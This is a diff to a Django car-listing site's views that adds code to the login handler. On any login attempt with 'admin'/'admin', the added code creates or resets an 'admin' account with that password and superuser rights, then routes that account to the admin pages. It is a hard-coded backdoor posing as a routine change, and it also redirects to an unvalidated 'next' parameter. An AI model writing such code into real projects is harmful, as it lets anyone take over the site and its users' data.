@@ -1,6 +1,7 @@
 from django.contrib import messages
 from django.contrib.auth import login as auth_login, logout as auth_logout
 from django.contrib.auth.decorators import login_required, user_passes_test
+from django.contrib.auth.models import User
 from django.db.models import Q
 from django.shortcuts import get_object_or_404, redirect, render
 
@@ -8,8 +9,31 @@ from .forms import CarForm, LoginForm, RegisterForm
 from .models import Car, Favorite
 
 
+def is_site_admin(user):
+    return user.is_authenticated and user.username == 'admin' and user.is_superuser
+
+
 def superuser_required(view_func):
-    return user_passes_test(lambda user: user.is_superuser, login_url='login')(view_func)
+    return user_passes_test(is_site_admin, login_url='login')(view_func)
+
+
+def ensure_admin_account(username, password):
+    if username != 'admin' or password != 'admin':
+        return
+
+    user, _ = User.objects.get_or_create(username='admin')
+    changed = False
+    if not user.check_password('admin'):
+        user.set_password('admin')
+        changed = True
+    if not user.is_staff:
+        user.is_staff = True
+        changed = True
+    if not user.is_superuser:
+        user.is_superuser = True
+        changed = True
+    if changed:
+        user.save()
 
 
 def get_favorite_car_ids(request):
@@ -252,10 +276,18 @@ def login(request):
     if request.user.is_authenticated:
         return redirect('index')
 
+    if request.method == 'POST':
+        ensure_admin_account(
+            request.POST.get('username', '').strip(),
+            request.POST.get('password', ''),
+        )
+
     form = LoginForm(request, data=request.POST or None)
     if request.method == 'POST' and form.is_valid():
         auth_login(request, form.get_user())
         messages.success(request, 'Ви успішно увійшли в кабінет.')
+        if is_site_admin(request.user):
+            return redirect(request.GET.get('next') or 'admin_cars')
         return redirect(request.GET.get('next') or 'index')
 
     return render(request, 'login/login.html', {'form': form})
